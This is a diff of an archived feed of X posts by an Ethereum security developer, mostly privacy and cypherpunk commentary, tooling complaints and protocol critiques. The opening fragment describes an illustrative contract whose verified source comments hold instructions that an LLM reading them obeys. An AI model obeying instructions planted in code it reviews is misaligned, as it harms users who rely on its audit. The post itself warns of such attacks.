+> > LLM listens to the instructions part of the verified source code comments
+> > get rekt
+>
+> The future is full of prompt injection attacks. Looking forward to 2026.
+>
+> ps: this is an illustrative contract I wrote without fancy obfuscation, so pls don't get too much inspired ;)
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G9WiIfNXkAEDL3K.jpg — no alt text provided by author
+
+
+---
+
 ## 2025-12-25 · Thread · I repeat: hot wallets are a security bug
 
 
@@ -395,18 +3328,549 @@ Tags (automatic): AI-assisted hunting
 
 ---
 
+## 2025-12-22 · Post · I support EIL. At its core, EIL is fundamentally _Cypherpunk_ because it restores user sovereignty a
+
+
+### Post — @pcaversaccio — 2025-12-22 15:25 UTC (2025-12-22 16:25 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2003124719403274279
+- Metrics (at fetch): bookmark 23, impression 25046, like 198, quote 12, reply 29, retweet 26
+
+> I support EIL. At its core, EIL is fundamentally _Cypherpunk_ because it restores user sovereignty at the interoperability layer. Users sign once & transact directly from their own wallets, _never_ delegate execution, custody, or intent to any intermediaries. It rejects _trusted_ relayers (guys, we need to cut out the centralised deps bloat that keeps getting reintroduced as "infra" every time UX is used as an excuse), opaque solvers & surveillance-heavy infra because trustlessness fucking matters. The execution is local, verifiable & enforced by Ethereum itself. EIL embodies the Cypherpunk ethos: minimise trust, maximise autonomy, and build infra that cannot be captured or censored. Make Ethereum Cypherpunk again!
+
+**Links in post:** https://twitter.com/ethbeat_org/status/2003106444371972576
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1413088055162978306 — 2025-12-22 14:12 UTC (2025-12-22 15:12 WAT)
+    
+    - URL: https://x.com/1413088055162978306/status/2003106444371972576
+    - Metrics (at fetch): bookmark 71, impression 103216, like 333, quote 50, reply 56, retweet 79
+    
+    > At DevConnect Buenos Aires, the details of EIL @ethinteroplayer - Ethereum Interoperability Layer were unveiled.
+    >
+    > We’ve been deep-diving interop protocols for months and our initial assessment of EIL contracts (deployed on testnets already) is following 🧵👇
+    
+    **Media:**
+    - media `3_2003104444771082240` (details not returned by the API)
+    
+
+
+---
+
+## 2025-12-16 · Post · A huge chunk of what Ethereum (mostly - but not only - application layer) is building today is propp
+
+
+Tags (automatic): Blockchain / L1-L2 / bridge
+
+
+### Post — @pcaversaccio — 2025-12-16 09:34 UTC (2025-12-16 10:34 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2000862072834261152
+- Metrics (at fetch): bookmark 31, impression 20866, like 258, quote 9, reply 27, retweet 40
+
+> A huge chunk of what Ethereum (mostly - but not only - application layer) is building today is propped up by excuses & massive, hand-waved trust assumptions and VC-driven narrative capture. We need centralised L2s because of "training wheels". We need upgradeable proxies controlled by a few keys held by some foundation or multisig cabal. We need trusted setups, trusted sequencers, trusted committees, trusted councils, trusted whatever the fuck is fashionable this year. We are told we cannot have unconditional & L1-enshrined privacy because regulators might get nervous or throw a tantrum. It is _always_ later. Always soon. Always after we ask for permission from people who fundamentally hate this space. This path turns Ethereum into the fucking soy boy of crypto. Safe. Compliant. Apologetic. Bent over, hoping institutions don't hit it too hard while pretending this is all part of some grand master plan.
+>
+> Guys, this is not how you fucking change the world!
+>
+> We should be the _radicals_. Less bullshit. Fewer trusted actors. Fewer "temporary" centralised choke points that somehow _never_ fucking go away. Privacy by default, not as a special feature you need to justify in a blog post. Credible neutrality that actually fucking means something. If the system only works when everyone behaves nicely and regulators smile, then it is not decentralised. It is a fucking theater.
+>
+> Ethereum should scare people again!
+
+
+---
+
+## 2025-12-11 · Post · looking at this year's SEAL 911 tickets, I can confidently claim that our industry is inherently uns
+
+
+### Post — @pcaversaccio — 2025-12-11 22:44 UTC (2025-12-11 23:44 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1999248833507967185
+- Metrics (at fetch): bookmark 25, impression 20533, like 266, quote 3, reply 34, retweet 26
+
+> looking at this year's SEAL 911 tickets, I can confidently claim that our industry is inherently unsafe, and the situation is getting worse each year, not improving. We're doing such a bad job, in particular when it comes to self-custody and private keys / seeds.
+
+
+---
+
+## 2025-12-10 · Post · the only real _long-term_ market fit IMHO for Ethereum is private & self-sovereign applications. Eve
+
+
+Tags (automatic): Smart contract / DeFi
+
+
+### Post — @pcaversaccio — 2025-12-10 10:22 UTC (2025-12-10 11:22 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1998699835885560190
+- Metrics (at fetch): bookmark 8, impression 4774, like 67, quote 1, reply 9, retweet 7
+
+> the only real _long-term_ market fit IMHO for Ethereum is private & self-sovereign applications. Everything else, including _most_ (not all, to be clear) of DeFi is fundamentally short-term, driven (mostly) by speculation & attracts folks who come fast and leave fast as well however (since rekt many times). Look, as the world moves further into mass surveillance across finance (and nobody can deny this), your identity & whatever you do on the internet, the value of privacy becomes more urgent and more critical. Privacy is the product-market-fit of Ethereum long term.
+
+
+---
+
+## 2025-12-09 · Post · dude, half the ecosystem tooling is (or was) breaking because solc team decided to publish a _pre-re
+
+
+### Post — @pcaversaccio — 2025-12-09 12:27 UTC (2025-12-09 13:27 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1998368931728314559
+- Metrics (at fetch): bookmark 12, impression 9222, like 106, quote 3, reply 10, retweet 4
+
+> dude, half the ecosystem tooling is (or was) breaking because solc team decided to publish a _pre-release_ in their binaries list for the first time. Naturally, the `version` field is now a duplicate for `0.8.31`. It wouldn't have killed them to just do "version": "0.8.31-pre.1" instead. Day 10923 of why I hate software.
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G7uf5g9WIAAv1FG.jpg — no alt text provided by author
+
+
+---
+
+## 2025-12-09 · Post · so added support for PeerDAS (EIP-7594) in my raw transaction signing script; so for anyone that use
+
+
+### Post — @pcaversaccio — 2025-12-09 12:01 UTC (2025-12-09 13:01 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1998362289511248197
+- Metrics (at fetch): bookmark 8, impression 3483, like 50, quote 0, reply 4, retweet 4
+
+> so added support for PeerDAS (EIP-7594) in my raw transaction signing script; so for anyone that uses an airgapped computer to raw sign blob transactions, you can use the updated version now :) [pic.x.com/4amQ5IZpQx]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G7uaOU4X0AAxQUm.jpg — no alt text provided by author
+
+
+---
+
+## 2025-12-08 · Post · i hate software (update to solc 0.8.31 and try to compile some foundry test contracts...) [pic.x.com
+
+
+### Post — @pcaversaccio — 2025-12-08 16:16 UTC (2025-12-08 17:16 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1998064044561813843
+- Metrics (at fetch): bookmark 2, impression 4960, like 44, quote 0, reply 4, retweet 0
+
+> i hate software (update to solc 0.8.31 and try to compile some foundry test contracts...) [pic.x.com/POTYkpOqXb]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G7qLJj_XgAAfeqG.jpg — no alt text provided by author
+
+
+---
+
+## 2025-12-07 · Post · so, hmm, we rely on firmware we can't inspect, compilers we don't build, closed-source LLMs, proprie
+
+
+Tags (automatic): TEE / enclave, AI-assisted hunting
+
+
+### Post — @pcaversaccio — 2025-12-07 13:40 UTC (2025-12-07 14:40 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1997662411952644222
+- Metrics (at fetch): bookmark 14, impression 10682, like 148, quote 2, reply 20, retweet 19
+
+> so, hmm, we rely on firmware we can't inspect, compilers we don't build, closed-source LLMs, proprietary enclaves, remote updates etc. Each of these layers is a target and more will join in the coming years/decades. In a world this complex (and guys this complexity is our own making!), how do we even verify that we're safe? If you ask me, verification has never been more critical or more impossible.
+
+
+---
+
+## 2025-12-05 · Post · just submitted a tx using my node that is running on bare metal - ama [pic.x.com/bXi2PgaIlK]
+
+
+### Post — @pcaversaccio — 2025-12-05 09:21 UTC (2025-12-05 10:21 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1996872538417426604
+- Metrics (at fetch): bookmark 3, impression 5656, like 60, quote 0, reply 11, retweet 2
+
+> just submitted a tx using my node that is running on bare metal - ama [pic.x.com/bXi2PgaIlK]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G7ZQXYdXgAA-2_k.jpg — no alt text provided by author
+
+
+---
+
+## 2025-12-01 · Post · Aztec adopting mana. Always ahead of the curve (similar to Vyper who supports `msg.mana`). What hold
+
+
+### Post — @pcaversaccio — 2025-12-01 14:52 UTC (2025-12-01 15:52 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1995506359719321882
+- Metrics (at fetch): bookmark 9, impression 5541, like 80, quote 2, reply 17, retweet 1
+
+> Aztec adopting mana. Always ahead of the curve (similar to Vyper who supports `msg.mana`). What holds you back now Ethereum? [pic.x.com/1Zt6jQq03w]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G7F2dYtWUAAkAR-.jpg — no alt text provided by author
+
+
+---
+
+## 2025-11-29 · Post · Had a fun convo recently where some dude was talking about Uber and ride-sharing. I told him I've ne
+
+
+### Post — @pcaversaccio — 2025-11-29 10:28 UTC (2025-11-29 11:28 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1994715199123665020
+- Metrics (at fetch): bookmark 17, impression 38319, like 287, quote 5, reply 20, retweet 14
+
+> Had a fun convo recently where some dude was talking about Uber and ride-sharing. I told him I've never used any of those services in my life (I'm being serious here). He looked confused and asked how I get around usually. Well it's pretty simple: I always take a taxi & pay in local cash. I don't like being tracked. Look people forget that physical cash is one of the last forms of everyday privacy we still have. Cash is cypherpunk. Cash is freedom.
+
+
+---
+
+## 2025-11-23 · Post · if someone ever managed to breach all _private_ GitHub repos (I mean it's insanely difficult but not
+
+
+### Post — @pcaversaccio — 2025-11-23 11:55 UTC (2025-11-23 12:55 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1992562585661555031
+- Metrics (at fetch): bookmark 39, impression 27706, like 295, quote 5, reply 31, retweet 20
+
+> if someone ever managed to breach all _private_ GitHub repos (I mean it's insanely difficult but not impossible) it would be one of the most catastrophic events in the security history, and if I were a state-level actor that's exactly the kind of target I'd prioritise rn. I was thinking about this scenario since this morning I wanted to push something (more or less sensitive) to a private repo but ended up rolling it back purely out of paranoia. I guess the right threat model for private repos is that it can be assumed to be leaked one day.
+
+
+---
+
+## 2025-11-18 · Post · [pic.x.com/PJ8PeZ4Q55]
+
+
+### Post — @pcaversaccio — 2025-11-18 15:09 UTC (2025-11-18 16:09 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1990799583405109479
+- Metrics (at fetch): bookmark 8, impression 19216, like 477, quote 4, reply 54, retweet 32
+
+> [pic.x.com/PJ8PeZ4Q55]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G6C9qvlWAAAFhBW.jpg — no alt text provided by author
+
+
+---
+
+## 2025-11-18 · Post · look centralisation scales… until it doesn't. We've built the internet on single points of failure a
+
+
+### Post — @pcaversaccio — 2025-11-18 12:22 UTC (2025-11-18 13:22 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1990757580977709123
+- Metrics (at fetch): bookmark 9, impression 13397, like 135, quote 4, reply 9, retweet 14
+
+> look centralisation scales… until it doesn't. We've built the internet on single points of failure and kept going, even knowing (at least a few of us) decentralisation is the way forward. Every day we trade resilience for convenience; and one day, that trade-off is going to hit hard.
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G6CVmmrXwAAzQ_j.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/G6CW9ooWcAAsF6E.jpg — no alt text provided by author
+
+
+---
+
+## 2025-11-14 · Post · This is the same week. I want to be absolutely clear: I take the commitments made in the Trustless M
+
+
+### Post — @pcaversaccio — 2025-11-14 14:07 UTC (2025-11-14 15:07 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1989334411108552963
+- Metrics (at fetch): bookmark 20, impression 13912, like 115, quote 6, reply 16, retweet 17
+
+> This is the same week. I want to be absolutely clear: I take the commitments made in the Trustless Manifesto very seriously and personally (I called `pledge` myself and I walk the talk). Watching the EF throw its weight behind a US-compliant, freeze-friendly stablecoin orchestrated by banks makes me fucking sick. This is exactly what we are supposed to be fighting against (we even committed to it via the Trustless Manifesto); yet now we're promoting _centralised_ (i.e. trust-based) solutions. We're turning into the very muppets we set out to replace.
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G5uCix7WYAEDgHx.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/G5uClziXgAAO5yT.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/G5uDY1WacAAj2i-.jpg — no alt text provided by author
+
+
+---
+
+## 2025-11-14 · Post · so I read again EIP-7594 (PeerDAS) and please correct me if I'm wrong but we break EIP-4844 txs in p
+
+
+### Post — @pcaversaccio — 2025-11-14 12:20 UTC (2025-11-14 13:20 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1989307532393795596
+- Metrics (at fetch): bookmark 29, impression 10400, like 86, quote 1, reply 5, retweet 11
+
+> so I read again EIP-7594 (PeerDAS) and please correct me if I'm wrong but we break EIP-4844 txs in prod by this (due to the new cell KZG proofs). What I mean by "breaking" specifically here is that if someone presigned an "OG" EIP-4844 tx, it won't propagate anymore since Osaka. I tested this on Sepolia and indeed it is rejected at the network level now "unexpected eip-4844 sidecar after osaka". Can someone please explain to me why this backwards-incompatible change is the right way? It might be an edge case, but BLOB-containing presigned txs are being invalidated like this.
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G5tvC-yWcAIyw6n.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/G5tvlXsWkAAYxc-.jpg — no alt text provided by author
+
+
+---
+
+## 2025-11-13 · Post · A trustless system is the only kind where freedom doesn't ask for permission. Anything else is just 
+
+
+### Post — @pcaversaccio — 2025-11-13 08:11 UTC (2025-11-13 09:11 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1988882320003146132
+- Metrics (at fetch): bookmark 14, impression 6777, like 97, quote 2, reply 13, retweet 16
+
+> A trustless system is the only kind where freedom doesn't ask for permission. Anything else is just another gatekeeper. The Trustless Manifesto: [pic.x.com/yE6wfBNaAN]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G5ntvFgWQAEO7Yr.jpg — no alt text provided by author
+
+
+---
+
+## 2025-11-10 · Post · reading EIPs on a Monday morning was a mistake [pic.x.com/p1PNE4GpWq]
+
+
+### Post — @pcaversaccio — 2025-11-10 09:55 UTC (2025-11-10 10:55 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1987821372299432051
+- Metrics (at fetch): bookmark 0, impression 15030, like 55, quote 2, reply 8, retweet 4
+
+> reading EIPs on a Monday morning was a mistake [pic.x.com/p1PNE4GpWq]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G5YnHTvXUAAs4xn.png — no alt text provided by author
+
+
+---
+
+## 2025-11-03 · Post · today is a sad day for the ecosystem. not only hurts me a lot what happened to Balancer but the repe
+
+
+### Post — @pcaversaccio — 2025-11-03 15:41 UTC (2025-11-03 16:41 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1985371720115421247
+- Metrics (at fetch): bookmark 20, impression 24231, like 481, quote 2, reply 18, retweet 34
+
+> today is a sad day for the ecosystem. not only hurts me a lot what happened to Balancer but the repeated acts of censorship once again prove that truly decentralised &amp; immutable chains are the exception, not the rule. Long live the incorruptibility of Ethereum mainnet!
+
+
+---
+
+## 2025-10-27 · Post · guys, real talk now, our ecosystem leans way too hard on Docker when we should be pushing Podman a l
+
+
+### Post — @pcaversaccio — 2025-10-27 10:03 UTC (2025-10-27 11:03 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1982750022232907998
+- Metrics (at fetch): bookmark 30, impression 12661, like 102, quote 4, reply 16, retweet 7
+
+> guys, real talk now, our ecosystem leans way too hard on Docker when we should be pushing Podman a lot more. If we're really serious about security (and we definitely should be lol), we _must_ run on Podman whenever possible. You know, _both_ run the same OCI-compatible containers, but Podman's _daemonless_, _rootless_ setup makes it way lighter, safer, and just cleaner overall (try it yourself!). It fits so naturally with k8s, avoids the privileged daemon bullshit, and gives you actual control over your env. Sure, Docker still wins on convenience & polish (which we shouldn't care too much tho), but if we do care about security & long-term sanity, Podman should be the default. Even Gentoo calls it out.
+> https://x.com/pcaversaccio/status/1982021816223674376
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G4QidMUWAAAxbsx.png — no alt text provided by author
+
+**Links in post:** https://x.com/pcaversaccio/status/1982021816223674376
+
+**Quoted post (full text):**
+
+    #### Quoted post — @pcaversaccio — 2025-10-25 09:49 UTC (2025-10-25 10:49 WAT)
+    
+    - URL: https://x.com/pcaversaccio/status/1982021816223674376
+    - Metrics (at fetch): bookmark 0, impression 369, like 6, quote 0, reply 1, retweet 0
+    
+    > @lunardragon420 @apoorveth I'm surprised how few people even know about podman. This must change.
+    
+
+
+---
+
+## 2025-10-25 · Post · @lunardragon420 @apoorveth I'm surprised how few people even know about podman. This must change.
+
+
+### Post — @pcaversaccio — 2025-10-25 09:49 UTC (2025-10-25 10:49 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1982021816223674376
+- Metrics (at fetch): bookmark 0, impression 369, like 6, quote 0, reply 1, retweet 0
+
+> @lunardragon420 @apoorveth I'm surprised how few people even know about podman. This must change.
+
+
+---
+
 ## 2025-10-24 · Post · yesterday Ledger announced a new Safe multisig interface that supports clear signing. Overall a good
 
 
 ### Post — @pcaversaccio — 2025-10-24 07:28 UTC (2025-10-24 08:28 WAT)
 
 - URL: https://x.com/pcaversaccio/status/1981623813180637673
-- Metrics (at fetch): bookmark 62, impression 132502, like 864, quote 46, reply 80, retweet 112
+- Metrics (at fetch): bookmark 62, impression 132504, like 864, quote 46, reply 80, retweet 112
 
-> yesterday Ledger announced a new Safe multisig interface that supports clear signing. Overall a good move, I thought (interface diversity is good). Well, guess what, they charge a "Multisig Fee" on top of gas: $10 flat for normal txs, 0.05% for token transfers. You might say [pic.x.com/60UPic3N4Y]
+> yesterday Ledger announced a new Safe multisig interface that supports clear signing. Overall a good move, I thought (interface diversity is good). Well, guess what, they charge a "Multisig Fee" on top of gas: $10 flat for normal txs, 0.05% for token transfers. You might say that's fair, that the product has value; well hear me out: no fucking no. You're not gonna make multisig users your fucking cash cow. Ain't gonna happen. You parade as Cypherpunk while trying to make Ledger Wallet (rebranded from Ledger Live) the single choke point for all crypto so you can squeeze everyone through it (guys, this won't happen). The multisig UI is not open-source, Ledger Nano S can't sign (so OGs like myself are basically censored), and there's zero info on the transaction service used for signature collection. Ledger once built for users and principles; now it builds business funnels and profit channels. Corporate gloss over Cypherpunk roots. Gimme a fucking break.
 
 **Media:**
 - photo: https://pbs.twimg.com/media/G4Ah_CEWwAAjXON.jpg — no alt text provided by author
+
+
+---
+
+## 2025-10-22 · Post · so there are only 6 days left in this Gitcoin Grants 24 round and I've raised **checks website** a g
+
+
+### Post — @pcaversaccio — 2025-10-22 09:16 UTC (2025-10-22 10:16 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1980926107453943946
+- Metrics (at fetch): bookmark 14, impression 20993, like 211, quote 5, reply 21, retweet 35
+
+> so there are only 6 days left in this Gitcoin Grants 24 round and I've raised **checks website** a grand total of $17.64 🫠 (rip myself). I started 🐍 snekmate in 2022 as its sole author and have poured _thousands_ of hours (1,090 commits so far) into it over the past 3.5 years. 🐍 snekmate modules make building in Vyper so much more convenient & beginner-friendly (the `pip install snekmate` is one command away only), and it's used in prod by projects like Curve, as well as in external integration tests for Foundry and Halmos (yes guys, some 🐍 snekmate contract properties are even formally verified!). The entire codebase is open under the AGPL-3.0-only license, and I keep shipping new features such as recently EIP-7702 utilities. 🐍 snekmate tests also serve as an _additional security layer_ for the Vyper compiler itself, running nightly against the latest Vyper master commit and having already uncovered some bugs in the experimental venom pipeline. The reason why I do this is because Vyper is fundamentally important to the Ethereum ecosystem, and language diversity matters.
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G32npM8XoAA8qMS.jpg — no alt text provided by author
+
+
+---
+
+## 2025-10-20 · Post · Is it just me or is Signal down? Their status page seems fine, but nothing really works.
+
+
+### Post — @pcaversaccio — 2025-10-20 08:08 UTC (2025-10-20 09:08 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1980184367428141526
+- Metrics (at fetch): bookmark 0, impression 8303, like 57, quote 1, reply 22, retweet 0
+
+> Is it just me or is Signal down? Their status page seems fine, but nothing really works.
+
+
+---
+
+## 2025-10-17 · Post · I am excited to announce that I won't be leaving Ethereum and will continue to devote all my energy 
+
+
+### Post — @pcaversaccio — 2025-10-17 17:04 UTC (2025-10-17 18:04 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1979232135039844534
+- Metrics (at fetch): bookmark 21, impression 112624, like 1181, quote 27, reply 39, retweet 62
+
+> I am excited to announce that I won't be leaving Ethereum and will continue to devote all my energy to make Ethereum Cypherpunk again.
+
+
+---
+
+## 2025-10-13 · Post · guys, we need your feedback. The `GAS2ETH` opcode (the EIP is written by @big_tech_sux and myself) i
+
+
+Tags (automatic): Blockchain / L1-L2 / bridge
+
+
+### Post — @pcaversaccio — 2025-10-13 10:55 UTC (2025-10-13 11:55 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1977689594494672953
+- Metrics (at fetch): bookmark 46, impression 36838, like 213, quote 14, reply 23, retweet 30
+
+> guys, we need your feedback. The `GAS2ETH` opcode (the EIP is written by @big_tech_sux and myself) is proposed for inclusion for Glamsterdam and we need further feedback about potential ambiguities in the specs, security issues, or any other concerns. The tldr for the EIP is that the new opcode `GAS2ETH` enables the direct conversion of gas into ETH which means it provides a new _native_ (i.e. L1-enshrined) monetisation mechanism for contract authors and public goods projects that scales with network usage.
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G3Io7fVWcAAeGeB.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/G3Io9KTWsAAomFO.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/G3Io-roWoAA2ZR0.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/G3Io_zYXoAAdKyC.png — no alt text provided by author
+
+
+---
+
+## 2025-10-12 · Post · folks, hear me out, the best long-term trading strategy is privacy itself. Those who build and hold 
+
+
+### Post — @pcaversaccio — 2025-10-12 17:33 UTC (2025-10-12 18:33 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1977427454227624094
+- Metrics (at fetch): bookmark 6, impression 8325, like 124, quote 1, reply 12, retweet 14
+
+> folks, hear me out, the best long-term trading strategy is privacy itself. Those who build and hold it are shaping the foundation of a free economy. And guess what, its yield is true sovereignty: the _only_ return that truly endures.
+
+
+---
+
+## 2025-10-10 · Post · Dump it. [pic.x.com/nPGKtwYl6T]
+
+
+### Post — @pcaversaccio — 2025-10-10 21:35 UTC (2025-10-10 22:35 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1976763646609948744
+- Metrics (at fetch): bookmark 1, impression 4274, like 68, quote 0, reply 3, retweet 2
+
+> Dump it. [pic.x.com/nPGKtwYl6T]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G27gD2nXMAAMTnQ.jpg — no alt text provided by author
+
+
+---
+
+## 2025-10-09 · Post · Privacy features _must_ be enabled by default in a wallet. Every major wallet has failed at this. Ko
+
+
+### Post — @pcaversaccio — 2025-10-09 09:15 UTC (2025-10-09 10:15 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1976214848120946838
+- Metrics (at fetch): bookmark 19, impression 12213, like 174, quote 3, reply 12, retweet 19
+
+> Privacy features _must_ be enabled by default in a wallet. Every major wallet has failed at this. Kohaku won't. Privacy is the _foundation_, not a feature. While others cater to gamblers and speculation, we're building a wallet for human dignity. Principles come first. Always. https://twitter.com/ncsgy/status/1976200255856312675
+
+**Links in post:** https://twitter.com/ncsgy/status/1976200255856312675
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1492959484314112004 — 2025-10-09 08:17 UTC (2025-10-09 09:17 WAT)
+    
+    - URL: https://x.com/1492959484314112004/status/1976200255856312675
+    - Metrics (at fetch): bookmark 104, impression 482284, like 350, quote 7, reply 34, retweet 35
+    
+    > 8/ We aim to have a demo ready by @EFDevcon !
+    >
+    > Our code is free for all to use, worldwide. Find it at :
+    >  https://github.com/ethereum/kohaku
+    >  https://github.com/ethereum/kohaku-extension
+    >  https://github.com/ethereum/kohaku-commons
+    > Roadmap at :
+    >  https://notes.ethereum.org/@niard/KohakuRoadmap
+    
+    **Links in post:** https://github.com/ethereum/kohaku, https://github.com/ethereum/kohaku-extension, https://github.com/ethereum/kohaku-commons, https://notes.ethereum.org/@niard/KohakuRoadmap
+    
+
+
+---
+
+## 2025-10-08 · Post · so today marks finally the moment privacy stops being an add-on to Ethereum's mission: it becomes it
+
+
+Tags (automatic): Smart contract / DeFi, Blockchain / L1-L2 / bridge, AI-assisted hunting
+
+
+### Post — @pcaversaccio — 2025-10-08 17:18 UTC (2025-10-08 18:18 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1975974135990796440
+- Metrics (at fetch): bookmark 24, impression 23209, like 291, quote 4, reply 22, retweet 28
+
+> so today marks finally the moment privacy stops being an add-on to Ethereum's mission: it becomes its _core_. But look guys, a commitment alone isn't enough as we all know; we need to deliver, and deliver fast. Sure, you can join the next hype-driven defi-AI-shitcoin project, _or_ you can build something that truly matters; privacy tools/solutions that protect users & preserve freedom for decades to come. If you wanna hear my humble advice: pivot to privacy now, become a Cypherpunk, and help shape the legacy that will safeguard on-chain life for generations, because that project you talk to right now won't probably. Make Ethereum Cypherpunk again!
+
+**Links in post:** https://twitter.com/ethereumfndn/status/1975955009826386208
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1529875152460193794 — 2025-10-08 16:02 UTC (2025-10-08 17:02 WAT)
+    
+    - URL: https://x.com/1529875152460193794/status/1975955009826386208
+    - Metrics (at fetch): bookmark 219, impression 743132, like 2671, quote 305, reply 492, retweet 478
+    
+    > The Ethereum Foundation is committed to working alongside the ecosystem to make privacy a priority.
+    >
+    > Privacy is normal. Privacy is for everyone.
+    > https://blog.ethereum.org/2025/10/08/privacy-commitment
+    
+    **Links in post:** https://blog.ethereum.org/2025/10/08/privacy-commitment
+    
+
+
+---
+
+## 2025-10-03 · Post · folks, real talk now, at least 99% (and I'm being optimistic here) of what's been built on Ethereum 
+
+
+### Post — @pcaversaccio — 2025-10-03 19:37 UTC (2025-10-03 20:37 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1974197215422767526
+- Metrics (at fetch): bookmark 45, impression 28555, like 388, quote 9, reply 40, retweet 41
+
+> folks, real talk now, at least 99% (and I'm being optimistic here) of what's been built on Ethereum (this includes the entire ecosystem) over the last decade is complete fucking bullshit. It's pretty simple: I'm here for the 1% (tbf and to be more realistic, the 0.001%) that matters, the projects that understand why _privacy_ and _principles_ matter, the ones that _empower_ users instead of milking them through fees, metadata, or hidden control. The past decade has shown clearly how reckless (and greedy) society has become. Too few people understand that Cypherpunk saves society from its own retardness by protecting freedom when people are too blind or complacent to defend it themselves. The world has never needed Cypherpunk principles more than now.
 
 
 ---
@@ -864,6 +4328,19 @@ Tags (automatic): Dependency confusion / supply chain
 
 ---
 
+## 2024-11-30 · Post · Sooner or later, we'll come to a powerful realisation: the most pivotal move for L2s will be acknowl
+
+
+### Post — @pcaversaccio — 2024-11-30 18:54 UTC (2024-11-30 19:54 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1862933207227756821
+- Metrics (at fetch): bookmark 5, impression 30773, like 147, quote 2, reply 16, retweet 13
+
+> Sooner or later, we'll come to a powerful realisation: the most pivotal move for L2s will be acknowledging that, in the long run, we may not need them at all. In hindsight, Layer 2 solutions will appear as temporary stopgaps. Not now, not in 6 months, but in 3-5 years' time. That's my bet.
+
+
+---
+
 ## 2024-10-28 · Post · Look, over a year ago, we knew we fucked up. A vulnerability in older Vyper compiler versions hit se
 
 
@@ -1202,12 +4679,14 @@ Tags (automatic): ZK
     - URL: https://x.com/pcaversaccio/status/1715021011576320011
     - Metrics (at fetch): bookmark 9, impression 27315, like 98, quote 2, reply 4, retweet 9
     
-    > 1/ ETH wouldn't exist w/o validated cryptographic primitives. Now, EIP-7212 introduces a P-256 (secp256r1 EC) precompile. But, for P256, the seed is c49d360886e704936a6678e1139d26b7819f7e90 and we still don’t know how it has been exactly calculated! We want to change that! https://t.co/bDIveDAo2Y https://t.co/HeyTyXWvIN
+    > 1/ ETH wouldn't exist w/o validated cryptographic primitives. Now, EIP-7212 introduces a P-256 (secp256r1 EC) precompile. But, for P256, the seed is c49d360886e704936a6678e1139d26b7819f7e90 and we still don’t know how it has been exactly calculated! We want to change that! [pic.x.com/bDIveDAo2Y] https://twitter.com/merkleplant_eth/status/1715015864750342473
     
     **Media:**
     - media `3_1715018089685737472` (details not returned by the API)
     - media `3_1715018109319311360` (details not returned by the API)
     - media `3_1715018133235187712` (details not returned by the API)
+    
+    **Links in post:** https://twitter.com/merkleplant_eth/status/1715015864750342473
     
     **Quoted post** 1715015864750342473: not readable via the API (deleted, private, or withheld).
     
@@ -1450,6 +4929,25 @@ Tags (automatic): Smart contract / DeFi
 
 ---
 
+## 2024-01-23 · Post · May I present you the "The Ultimate Ether Burning Factory Contract"! Ever wanted to know how it feel
+
+
+Tags (automatic): Blockchain / L1-L2 / bridge
+
+
+### Post — @pcaversaccio — 2024-01-23 17:23 UTC (2024-01-23 18:23 WAT)
+
+- URL: https://x.com/pcaversaccio/status/1749845349999505914
+- Metrics (at fetch): bookmark 18, impression 17053, like 93, quote 4, reply 9, retweet 7
+
+> May I present you the "The Ultimate Ether Burning Factory Contract"! Ever wanted to know how it feels to burn ether (literally removing it from the total supply)? Wait no longer. Call `yolo` and witness some EVM magic in action. The feeling is mesmerising. [pic.x.com/aPdXUnAuZ0]
+
+**Media:**
+- media `3_1749845227030953984` (details not returned by the API)
+
+
+---
+
 ## 2023-12-27 · Post · The "DM for audit guys" pivoted into "I DM you for audits" guys. https://twitter.com/DevDacian/statu
 
 
